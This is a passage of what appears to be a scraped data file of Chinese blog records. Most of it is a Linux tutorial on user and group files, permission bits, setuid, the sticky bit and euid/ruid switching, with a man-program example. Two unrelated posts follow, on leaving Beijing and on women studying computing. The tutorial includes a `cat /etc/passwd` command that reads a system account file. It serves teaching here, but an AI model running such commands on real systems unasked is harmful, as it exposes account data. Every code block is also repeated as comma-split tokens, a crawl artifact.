每条记录字段分别为 ,组名：口令（一般不存在组口令）：GID：组成员用户列表（逗号分割的用户UID列表）,\n,对于 ,/etc/shadow, ，每条记录字段分别为： ,登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:,\n,举例,\n,以下是对用户和组信息的举例。 ,/etc/shadow, 中的口令信息为加密存储，不举例。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$cat /etc/passwd |head -n 5\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\r\nbin:x:2:2:bin:/bin:/bin/sh\r\nsys:x:3:3:sys:/dev:/bin/sh\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\n\r\n$cat /etc/group |head -n 5\r\nroot:x:0:\r\ndaemon:x:1:\r\nbin:x:2:\r\nsys:x:3:\r\nadm:x:4:miracle,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,cat, ,/,etc,/,passwd, ,|,head, ,-,n, ,5,root,:,x,:,0,:,0,:,root,:,/,root,:,/,bin,/,bash,daemon,:,x,:,1,:,1,:,daemon,:,/,usr,/,sbin,:,/,bin,/,sh,bin,:,x,:,2,:,2,:,bin,:,/,bin,:,/,bin,/,sh,sys,:,x,:,3,:,3,:,sys,:,/,dev,:,/,bin,/,sh,sync,:,x,:,4,:,65534,:,sync,:,/,bin,:,/,bin,/,sync, ,$,cat, ,/,etc,/,group, ,|,head, ,-,n, ,5,root,:,x,:,0,:,daemon,:,x,:,1,:,bin,:,x,:,2,:,sys,:,x,:,3,:,adm,:,x,:,4,:,miracle,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,文件权限控制信息,\n,文件类型,\n,Linux, 中的文件有如下类型：,\n,\n,普通文件， 又包括文本文件和二进制文件， 可用 ,touch, 创建；,\n,套接字文件， 用于网络通讯，一般由应用程序在执行中间接创建；,\n,管道文件是有名管道，而非无名管道， 可用 ,mkfifo, 创建；,\n,字符文件和块文件均为设备文件， 可用 ,mknod, 创建；,\n,链接文件是软链接文件，而非硬链接文件, 可用 ,ln, 创建。,\n,\n,访问权限控制组,\n,分为三组进行控制：,\n,\n,user, 包含对文件属主设定的权限,\n,group, 包含对文件属组设定的权限,\n,others, 包含对其他者设定的权限,\n,\n,可设定的权限,\n,下面给出常见（但非全部）的权限值， 包括：,\n,\n,r, 表示具有读权限。,\n,w, 表示具有写权限。,\n,x, 一般针对可执行文件/目录，表示具有执行/搜索权限。,\n,s, 一般针对可执行文件/目录，表示具有赋予文件属主权限的权限，只有 ,user, 和 ,group, 组可以设置该权限。,\n,t, 一般针对目录，设置粘滞位后，有权限的用户只能写、删除自己的文件,否则可写、删除目录所有文件。旧系统还表示可执行文件运行后将text拷贝到交换区提升速度。,\n,\n,举例,\n,通过 ,ls -l, 可以查看到其文件类型及权限，通过 ,chmod, 修改权限。,\n,举例来说，,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ls -l /usr/bin/qemu-i386 \r\n-rwxr-xr-x 1 root root 2149080  8月 13  2014 /usr/bin/qemu-i386\r\n$ chmod 1775 test/\r\n$ ls -l |grep test\r\ndrwxrwxr-t 2 miracle video 4096  7月 20 09:31 test\r\n$ chmod 2777 test2/\r\n$ ls -l |grep test2\r\ndrwxrwsrwx 2 miracle video 4096  7月 20 09:32 test2\r\n$ chmod 4777 test3/\r\n$ ls -l |grep test3\r\ndrwsrwxrwx 2 miracle video 4096  7月 20 09:33 test3,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ls, ,-,l, ,/,usr,/,bin,/,qemu,-,i386, ,-,rwxr,-,xr,-,x, ,1, ,root ,root, ,2149080,  ,8,月, ,13,  ,2014, ,/,usr,/,bin,/,qemu,-,i386,$, ,chmod, ,1775, ,test,/,$, ,ls, ,-,l, ,|,grep ,test,drwxrwxr,-,t, ,2, ,miracle ,video, ,4096,  ,7,月, ,20, ,09,:,31, ,test,$, ,chmod, ,2777, ,test2,/,$, ,ls, ,-,l, ,|,grep ,test2,drwxrwsrwx, ,2, ,miracle ,video, ,4096,  ,7,月, ,20, ,09,:,32, ,test2,$, ,chmod, ,4777, ,test3,/,$, ,ls, ,-,l, ,|,grep ,test3,drwsrwxrwx, ,2, ,miracle ,video, ,4096,  ,7,月, ,20, ,09,:,33, ,test3,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输出中， 第1个字符表示文件类型，其中，普通文件(,-,)、目录文件 (,d,)、套接字文件(,s,)，管道文件(,p,)，字符文件(,c,)，块文件(,b,)，链接文件(,l,)； 第2个字符开始的 ,-rwxr-xr-x, 部分表示文件的权限位，共有9位。,\n,对于文件 ,/usr/bin/qemu-i386, , 这个权限控制的含义是：,\n,\n,第2~4位的 ,rwx, 表示该文件可被它的 ,owner, （属主）以 ,r, 或 ,w, 或 ,x, 的权限访问。,\n,第5~7位的 ,r-x, 表示该文件可被与该文件同一属组的用户以 ,r, 或 ,x, 的权限访问,\n,第8~10位的 ,r-x, 表示该文件可被其它未知用户以 ,r, 或 ,x, 的权限访问。,\n,\n,对于 ,test/, test2/, test3/, 设定的权限：,\n,\n,r,w,x, 权限对每一权限控制组的权限用一位8进制来表示； 例如： ,755, 表示 ,rwxr-xr-x, 。,\n,s,t, 权限会替代 ,x, 位置显示；设定 ,s,t, 权限则需在对应的、用于控制 ,r,w,x, 的8进制权限控制组前追加数字； ,s, 权限用于属主属组控制， ,t, 用于其它控制。,\n,设定属主 ,s, 需追加 ,4,, 设定属组 ,s, 追加 ,2,, 设定其它者 ,t, 权限追加 ,1, ； 例如前面对 ,test/, 设定 ,t,, 则用 ,1775,, 表示 ,rwxrwxr-t, 。,\n,\n,进程权限控制信息,\n,进程权限,\n,对于进程，有如下属性与文件访问权限相关：,\n,\n,effective user id, : 进程访问文件权限相关的 ,UID, （简写为 ,euid, ）。,\n,effective group id, : 进程访问文件权限相关的 ,GID, （简写为 ,egid, ）。,\n,real user id, : 创建该进程的用户登录系统时的 ,UID, （简写为 ,ruid, ）。,\n,real group id, : 创建该进程的用户登录系统时的 ,GID, （简写为 ,rgid, ）。,\n,saved set user id, : 拷贝自 ,euid, 。,\n,saved set group id, : 拷贝自 ,egid, 。,\n,\n,举例,\n,我们可以使用 ,ps, 和 ,top, 选择查看具有 ,euid, 和 ,ruid, 的进程。或者通过 ,top, 来查看进程的 ,euid, 和 ,ruid,\n,通过 ,top, 来查看的例子：,\n,\n,首先输入 ,top, 得到类似如下,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$top -d 10.10\r\ntop - 15:50:39 up 9 days,  1:42,  9 users,  load average: 0.13, 0.16, 0.21\r\nTasks: 287 total,   2 running, 284 sleeping,   0 stopped,   1 zombie\r\nCpu(s): 20.8%us,  4.6%sy,  0.0%ni, 72.5%id,  2.1%wa,  0.0%hi,  0.0%si,  0.0%st\r\nMem:   7707276k total,  7574252k used,   133024k free,   154872k buffers\r\nSwap:  1998844k total,   223744k used,  1775100k free,  3330212k cached\r\n\r\n  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                \r\n31603 miracle   20   0 2368m 681m  52m S    6  9.1 206:07.74 firefox                                                                                \r\n 1507 root      20   0  451m 188m  97m S    2  2.5 193:49.86 Xorg  \r\n....,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,top, ,-,d, ,10.10,top, ,-, ,15,:,50,:,39, ,up, ,9, ,days,,,  ,1,:,42,,,  ,9, ,users,,,  ,load ,average,:, ,0.13,,, ,0.16,,, ,0.21,Tasks,:, ,287, ,total,,,   ,2, ,running,,, ,284, ,sleeping,,,   ,0, ,stopped,,,   ,1, ,zombie,Cpu,(,s,),:, ,20.8,%,us,,,  ,4.6,%,sy,,,  ,0.0,%,ni,,, ,72.5,%,id,,,  ,2.1,%,wa,,,  ,0.0,%,hi,,,  ,0.0,%,si,,,  ,0.0,%,st,Mem,:,   ,7707276k, ,total,,,  ,7574252k, ,used,,,   ,133024k, ,free,,,   ,154872k, ,buffers,Swap,:,  ,1998844k, ,total,,,   ,223744k, ,used,,,  ,1775100k, ,free,,,  ,3330212k, ,cached, ,  ,PID ,USER      ,PR  ,NI  ,VIRT  ,RES  ,SHR, ,S, ,%,CPU, ,%,MEM    ,TIME,+,  ,COMMAND,                                                                                ,31603, ,miracle,   ,20,   ,0, ,2368m, ,681m,  ,52m, ,S,    ,6,  ,9.1, ,206,:,07.74, ,firefox,                                                                                , ,1507, ,root,      ,20,   ,0,  ,451m, ,188m,  ,97m, ,S,    ,2,  ,2.5, ,193,:,49.86, ,Xorg,  ,.,.,.,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n这里通过 ,-d, 选项延长 ,top, 的刷新频率便于操作。此处可见，只有 ,USER, 字段，表示相应进程的 ,effective user id,.,\n,打开 ,read user id, 的显示选项\n,\n,在 ,top, 命令运行期间，输入 ,f,, 可以看见类似如下行：,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nc: RUSER      = Real user name,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,c,:, ,RUSER,      ,=, ,Real ,user ,name,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,输入 ,c, 即可打开 ,Real user name, 的显示开关。,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n* C: RUSER      = Real user name,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,*, ,C,:, ,RUSER,      ,=, ,Real ,user ,name,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,最后 ,Return, 回车回到 ,top, 中，即可看到 ,real user id, 的选项此时输入 ,o,,可调整列次序最终我们可看到包含 ,effective user id, 和 ,real user id, 的输出如下：,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntop - 15:57:58 up 9 days,  1:49,  9 users,  load average: 0.23, 0.22, 0.23\r\nTasks: 286 total,   1 running, 284 sleeping,   0 stopped,   1 zombie\r\nCpu(s):  3.9%us,  1.4%sy,  0.0%ni, 94.6%id,  0.1%wa,  0.0%hi,  0.0%si,  0.0%st\r\nMem:   7707276k total,  7539776k used,   167500k free,   154996k buffers\r\nSwap:  1998844k total,   225132k used,  1773712k free,  3300036k cached\r\n\r\n  PID USER     RUSER     PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                              \r\n31603 miracle  miracle   20   0 2376m 688m  52m S    4  9.2 206:24.14 firefox                    \r\n 1507 root     root      20   0  451m 188m  97m S    3  2.5 194:06.27 Xorg  \r\n ....,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,top, ,-, ,15,:,57,:,58, ,up, ,9, ,days,,,  ,1,:,49,,,  ,9, ,users,,,  ,load ,average,:, ,0.23,,, ,0.22,,, ,0.23,Tasks,:, ,286, ,total,,,   ,1, ,running,,, ,284, ,sleeping,,,   ,0, ,stopped,,,   ,1, ,zombie,Cpu,(,s,),:,  ,3.9,%,us,,,  ,1.4,%,sy,,,  ,0.0,%,ni,,, ,94.6,%,id,,,  ,0.1,%,wa,,,  ,0.0,%,hi,,,  ,0.0,%,si,,,  ,0.0,%,st,Mem,:,   ,7707276k, ,total,,,  ,7539776k, ,used,,,   ,167500k, ,free,,,   ,154996k, ,buffers,Swap,:,  ,1998844k, ,total,,,   ,225132k, ,used,,,  ,1773712k, ,free,,,  ,3300036k, ,cached, ,  ,PID ,USER     ,RUSER     ,PR  ,NI  ,VIRT  ,RES  ,SHR, ,S, ,%,CPU, ,%,MEM    ,TIME,+,  ,COMMAND,                              ,31603, ,miracle  ,miracle,   ,20,   ,0, ,2376m, ,688m,  ,52m, ,S,    ,4,  ,9.2, ,206,:,24.14, ,firefox,                    , ,1507, ,root     ,root,      ,20,   ,0,  ,451m, ,188m,  ,97m, ,S,    ,3,  ,2.5, ,194,:,06.27, ,Xorg,  , ,.,.,.,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n其中， ,PID, 是对应进程， ,USER, 是对应的 ,effective user,, ,RUSER, 是对应的 ,real user, 。,\n,\n,\n,\n,进程访问文件的权限控制策略,\n,规则,\n,进程访问文件大致权限控制策略,\n,对于进程访问文件而言，最重要的是 ,euid,, 所以其权限属性均以 ,euid, 为 “中心”。,\n,\n,进程的 ,euid, 一般默认即为 其 ,ruid, 值,\n,若可执行文件的可执行权限位为 ,s, ，进程对其调用 ,exec, 后，其 ,euid, 被设置为该可执行文件的 ,user id,\n,进程的 ,saved set user id, 拷贝自 ,euid,.,\n,当进程的 ,euid, 与文件的 ,user id, 匹配时，进程才具有文件 ,user, 权限位所设定的权限,\n,组权限 ,egid, 的控制规则类似。,\n,\n,通过 ,exec, 执行文件修改权限属性,\n,通过 ,exec, 调用可执行文件之时：,\n,\n,进程 ,ruid, 值始终不变；,\n,saved set-user ID, 始终来自 ,euid, ；,\n,euid, 值取决于文件的 ,set-user-ID, 位是否被设置。,\n,\n,如下：,\n,\n,\n,\n,\n, ,\n,\n,\n,ID,\n,set-user-ID bit off,\n,set-user-ID bit on,\n,\n,\n,\n,\n,real user ID,\n,unchanged,\n,unchanged,\n,\n,\n,\n,\n,effective user ID,\n,unchanged,\n,set from userID of program file,\n,\n,\n,\n,\n,saved set-user ID,\n,copied from effective user ID,\n,copied from effective user ID,\n,\n,\n,\n,通过 ,setuid(uid), 系统调用修改权限属性,\n,通过 ,setuid(uid), 修改权限属性之时：,\n,\n,superuser, 可顺利修改 ,ruid,, ,euid,, ,saved set-user ID, ；,\n,unprivileged user, 只能在 ,uid, 与 ,ruid, 相等时修改 ,euid,, 其它无法修改。,\n,\n,如下：,\n,\n,\n,\n,\n, ,\n,\n,\n,ID,\n,superuser,\n,unprivileged user,\n,\n,\n,\n,\n,real user ID,\n,set to uid,\n,unchanged,\n,\n,\n,\n,\n,effective user ID,\n,set to uid,\n,set to uid,\n,\n,\n,\n,\n,saved set-user ID,\n,set to uid,\n,unchanged,\n,\n,\n,\n,举例,\n,再举几个比较特别的例子：,\n,设置了 ,set-user-id,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ls -l /usr/bin/sudo\r\n-rwsr-xr-x 1 root root 71288  2月 28  2013 /usr/bin/sudo,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ls, ,-,l, ,/,usr,/,bin,/,sudo,-,rwsr,-,xr,-,x, ,1, ,root ,root, ,71288,  ,2,月, ,28,  ,2013, ,/,usr,/,bin,/,sudo,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如前所述，这个输出的含义是，对于 ,/usr/bin/sudo, 文件，,\n,\n,第1~3位的 ,rws, 表示该文件可被它的owner（属主）以 ,r, 或 ,w, 或 ,s, 的权限访问,\n,第4~6位的 ,r-x, 表示该文件可被与该文件同一属组的用户以 ,r, 或 ,x, 的权限访问。,\n,第7~9位的 ,r-x, 表示该文件可被其它未知用户以 ,r, 或 ,x, 的权限访问。,\n,\n,这样设置之后，对于owner，具有读、写、执行权限，这一点没有什么不同。但是对于不属于 ,root, 组的普通用户进程来说，却大不相同。,\n,普通用户进程执行 ,sudo, 命令时通过其 ,others, 中的 ,x, 获得执行权限，再通过 ,user, 中的 ,s, 使得普通用户进程临时具有了 ,sudo, 可执行文件属主( ,root, )的权限，即超级权限。,\n,这也是为什么通过 ,sudo, 命令就可以让普通用户执行许多管理员权限的命令的原因。,\n,设置了 ,stick-bit,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ls -l / |grep tmp\r\ndrwxrwxrwt  25 root root 12288  7月 20 09:09 tmp,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ls, ,-,l, ,/, ,|,grep ,tmp,drwxrwxrwt,  ,25, ,root ,root, ,12288,  ,7,月, ,20, ,09,:,09, ,tmp,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这样设置之后，对于 ,/tmp, 目录，任何人都具有读、写、执行权限，这一点没有什么不同。但是对于 ,others, 部分设置了粘滞位 ,t,, 其功能却大不相同。,\n,若目录没设置粘滞位，任何对目录有写权限者都则可删除其中任何文件和子目录，即使他不是相应文件的所有者，也没有读或写许可; 设置粘滞位后，用户就只能写或删除属于他的文件和子目录。,\n,这也是为什么任何人都能向 ,/tmp, 目录写文件、目录，却只能写和删除自己拥有的文件或目录的原因。,\n,举一个 ,man, 程序的应用片断，描述 ,set-user-id, 和 ,saved set-user-id, 的使用,\n,man, 程序可以用来显示在线帮助手册， ,man, 程序可以被安装指定 ,set-user-ID, 或者 ,set-group-ID, 为一个指定的用户或者组。,\n,man, 程序可以读取或者覆盖某些位置的文件，这一般由一个配置文件(通常是 ,/etc/man.config, 或者 ,/etc/manpath.config, )或者命令行选项来进行配置。,\n,man, 程序可能会执行一些其它的命令来处理包含显示的 ,man, 手册页的文件。,\n,为防止处理出错， ,man, 会从两个特权之间进行切换：运行 ,man, 命令的用户特权，以及 ,man, 程序的拥有者的特权。,\n,需要抓住的主线：当只执行 ,man, 之时，进程特权就是 ,man, 用户的特权， 当通过 ,man, 执行子进程（如通过 ,!bash, 引出shell命令）时，用户切换为当前用户，执行完又切换回去。,\n,过程如下：,\n,\n,假设 ,man, 程序文件被用户 ,man, 所拥有，并且已经被设置了它的 ,set-user-ID, 位，当我们 ,exec, 它的时候，我们有如下情况：\n,\n,real user ID, = 我们的用户UID,\n,effective user ID, = man用户UID,\n,saved set-user-ID, = man用户UID,\n,\n,\n,man, 程序会访问需要的配置文件和 ,man, 手册页。这些文件由 ,man, 用户所拥有，但是由于 ,effective user ID, 是 ,man,,文件的访问就被允许了。,\n,在 ,man, 为我们运行任何命令的时候，它会调用 ,setuid(getuid())), (,getuid(), 返回的是 ,real user id,).因为我们不是 ,superuser, 进程，这个变化只能改变 ,effective user ID,. 我们会有如下情况：\n,\n,real user ID, = 我们的用户UID(不会被改变),\n,effective user ID, = 我们的用户UID,\n,saved set-user-ID, = man 的用户UID(不会被改变),\n,\n,现在 ,man, 进程运行的时候把我们得UID作为它的 ,effective user ID,.这也就是说，我们只能访问我们拥有自己权限的文件。也就是说，它能够代表我们安全地执行任何 ,filter,.,\n,当 ,filter, 做完了的时候， ,man, 会调用 ,setuid(euid),.这里， ,euid, 是 ,man, 用户的UID.(这个ID是通过 ,man, 调用 ,geteuid, 来保存的)这个调用是可以的，因为 ,setuid, 的参数和 ,saved set-user-ID, 是相等的。(这也就是为什么我们需要 ,saved set-user-ID,).这时候我们会有如下情况：\n,\n,real user ID, = 我们的用户UID(不会被改变),\n,effective user ID, = man的UID,\n,saved set-user-ID, = man 的用户UID(不会被改变),\n,\n,\n,由于 ,effective user ID, 是 ,man,,现在 ,man, 程序可以操作它自己的文件了。通过这样使用 ,saved set-user-ID,,我们可以在进程开始和结束的时候通过程序文件的 ,set-user-ID, 来使用额外的权限。然而，期间我们却是以我们自己的权限运行的。如果我们无法在最后切换回 ,saved set-user-ID,,我们就可能会在我们运行的时候保留额外的权限。,\n,\n,下面我们来看看如果 ,man, 启动一个 ,shell, 的时候会发生什么：,\n,\n,这里的 ,shell, 是 ,man, 使用 ,fork, 和 ,exec, 来启动的。,\n,因为这时 ,real user ID, 和 ,effective user ID, 都是我们的普通用户UID(参见step3)， 所以 ,shell, 没有其它额外的权限.,\n,启动的 ,shell, 无法访问 ,man, 的 ,saved set-user-ID(man), ,因为 ,shell, 的 ,saved set-user-ID, 是由 ,exec, 从 ,effective user ID, 拷贝过来的。,\n,在执行 ,exec, 的子进程( ,shell, )中，所有的 ,user ID, 都是我们的普通用户ID.,\n,\n,实际上，我们描述 ,man, 使用 ,setuid, 函数的方法不是特别正确，因为程序可能会 ,set-user-ID, 为 ,root, .这时候， ,setuid, 会把所有三种uid都变成你设置的id，但是我们只需要设置 ,effective user ID,.,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114087/", "url_object_id": "20d7b616b6fb5b1d5bcbf0b78222d68f", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/career.jpg"], "title": "IT程序员的抉择：我要离开帝都了", "create_time": "2018/06/21", "vote": "1", "bookmark": 0, "comments": "4", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,做我自己的主人,   ,\n,不知不觉在北京已经漂泊了近5年了，共为3家公司打过工，其中有几十人的小公司，也有几万人的大公司。随着工作技能的提升和工作经验的积累，薪水自然也涨了不少，但是看着北京的房价、物价飞涨，感觉自己赚多少都是小钱，还不如尽早卷铺盖回内蒙老家发展。那里毕竟是老家，亲戚朋友相对多一点。随着年龄的增长，也想有个自己的家了。,\n,之前犹犹豫豫的好长时间，不知道自己是留是走，今天还是详细的罗列了两个地方发展的坏处：,\n,呆在北京坏处：,\n,（1）工作压力大,\n,尤其是互联网公司，研发需求还是比较多的，有些需求还比较急，清闲的时候少。不过现在觉得还好，技术上有很大的进步，能独立扛事儿，一般的IT研发岗位还是可以得心应手的。,\n,（2）房价高，落户难,\n,在北京落户，有一套自己的房子，这想都不敢想了。看着日益飙高的房价和近乎不可能满足的帝都落户条件，如果要呆在北京发展，那注定一辈子只能租房了，像我的同学一样，在偏远一点的地方租个小两居，再买个,\n15万以下的车代步，总感觉这不是我想要的生活。,\n,（3）空气差，雾霾严重,\n,每天吸雾霾，我都不知道的少活多少年了。随着年龄的增长，感觉身体才最重要，尤其是看到认识的人得了重病后更感觉身体的宝贵。如果继续呆在帝都的话，那也只能是天天吸了。,\n,（4）漂泊孤独感,\n,没亲戚，只有几个在大学交好的同学，不过现在也都各忙各的，聚的少，大部分时间还是自己一个人。工作这么多年，也少有能交心的同事。一直感觉自己的生活过的并不快乐，也许有个人陪伴会好很多吧。,\n,（5）离父母太远,\n,父母已经上年纪了，而且也不希望离他们太远，万一有个病痛啥的，照顾实在不方便。,\n,呆在内蒙坏处：,\n,（1）知名IT企业少，岗位技术含量低,\n,去年中旬专门休了年假回内蒙面试了几家IT公司，挑来挑去还是选择回京继续工作。主要是外包的多，充其量也就给企业做定制化软件，有的还要求驻场开发，几乎没有做自家产品的。这种性质的岗位貌,\n似也不轻松。,\n,（2）薪水低,\n,薪水和帝都比起来，都不能用腰斩来形容了，要1万都觉得太多，这个心理落差的承受，而且内蒙还不是强制单位上五险一金，所以只有2家公司有五险一金，而且按最低额度缴纳。如果没有房贷，车贷，这个薪水也不是不能接受。这些年在北京也赚了一点钱，再找父母凑点，房子还是能勉强买的起的。,\n,（3）容易不满足现状，不甘心,\n,如果岗位技术含量低，而且活儿还多的话，肯定干不长久。而且本人很喜欢技术，很爱在技术上玩儿点高端的。哎，实在不行就自个儿干吧，写写技术书，录录网络课程啥的，相对来说即能选择性学习一些,\n感兴趣的技术，又不至于饿死吧。,\n,（4）空气干燥，对某些植物过敏，容易引发过敏性鼻炎,\n,内蒙是没有雾霾，但是有沙尘暴，而且为了绿化植被，防止沙漠化，种了一些叫不上名的植物，我很过敏。,\n,（5）回去容易出来难,\n,我30出头的年龄，回去肯定要成家的，有家了出来可就难了。,\n,反正选择在哪个地方发展坏处都不少。但是这么多年在北京奋斗，我感觉除了看上北京的工作机会，就再也没有让我留恋的东西了。我要辞职了，我要离开北京了，再见！2018.6.16,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    , 4 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114136/", "url_object_id": "c4156eb16689abd02ccd4f571b73594d", "front_image_path": "full/18fc86594a34c2bebbefd765480669feb0504c69.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/cebf98169b4fd1e38a35c3537129ceaa.jpg"], "title": "计算机专业太难不适合女生学？来看 N 多小姐姐的回应", "create_time": "2018/06/22", "vote": "1", "bookmark": "2", "comments": "4", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文作者： ,伯乐在线, - ,伯小乐, 。未经作者许可，禁止转载！,欢迎加入伯乐在线 ,专栏作者,。,高考结束了，填志愿选专业的时候也要来了。最近我们微博收到一个私信求助：,\n,\n,https://weibo.com/2093492691/GmruxxXrK,\n,在,@程序员的那些事, 微博发布后，有位小姐姐还感叹：,\n,@刘不刘二小姐：没想到“计算机太难不适合女生学”的观点五年前我上大学的时候有，现在都火成这样了还有[二哈],\n,很多关注我们的小姐姐都冒泡留言，鼓励那位求助的女生。汇总如下：,\n,@澈海情深：计算机女生出来说一句，现在干啥都挺难的。学计算机也没有想象中那么恐怖。感兴趣就学呗。,\n,@眠眠阿卷：选吧，学计算机又不是以后当码农，计算机是个工具，你学了计算机，以后去哪里再读其他专业都受欢迎,\n,@J家蠢萌痴汉夏：怎么会，我就毕业了呀，毕业还是简单的，只要好好听课，也不会挂科的[二哈] 当年高考结束填志愿，五个全是计算机第一顺位，🙊回过头想想也是有勇气啊,\n,@凃小斐：老子就是女孩子，毕业的时候专业第一的成绩保送985研究生，谁跟你说女孩子不适合学计算机的出来我打死他,\n,@于梦杰呀：计算机系女生表示难确实是难，有时还会感觉痛苦，但是只要你好好学肯定是能学好的,\n,@enchantereyes：喜欢就选。首先再菜毕业也不会难，另外学一行跟干一行是两码事。难得有想学的东西，不试试不会不甘心吗？,\n,@geekInfo：我也是计算机出来的女生。最初的专业是应用数学选修经济，学了一学期不开心反而喜欢计算机课就转了专业。读大学之前一点编程基础也没有，也不就这么顺利研究生毕业了。毕业成绩年级第二，文凭还没到手就被公司定下来了，到现在一直很喜欢这职业，庆幸当初转了专业，要学自己感兴趣的。,\n,@月光少爷金：时代不一样了，女程序猿不知道多受欢迎。况且，不学计算机，学统计将来做策略也不错呀,\n,@芒果很忙busybusy：学吧，入门没有想象中那么难的，我就是程序媛，IT公司女生少，环境相对比较单纯，是非也少，女生挺受宠的,\n,@茶杯茶茶茶：计算机有脑子的都能学，很好学的，相比于其他的专业，至少很多东西可以直接上手及时反馈，网上教程一大堆，只有计算机方面的可以。,\n,@翡翠梦境里睡觉的猫：有兴趣就可以选，当年报志愿之前也有人再三强调学计算机累（倒是没说女生不适合，现在想来在当时已经难得），然而我高中学了一点编程觉得有趣，于是选了，于是一路计算机好多年仍然觉得很有趣,\n,其他几个男生的留言：,\n,@MSP-GawainAntarx：难的不是计算机科学，而且怎么让自己抛弃“女生不适合学计算机”的刻板印象,\n,@mtedrrqcmws2017：1. 年轻女程序员在应聘过程中不但不会被歧视，反而会被有所偏袒，因为公司（尤其是大公司）普遍男生太多，需要女生来平衡工作环境。2. 现代编程语言已经被高度抽象，脱离硬件，倒更加靠近“技术设计”，入门并非男式，比如前端，手机app等。,\n,如果以后还有人和你说「计算机专业不适合女生」之类的，可以把本文发给他们看，让他们看看 IT 行业小姐姐们是如何说的。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 4 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        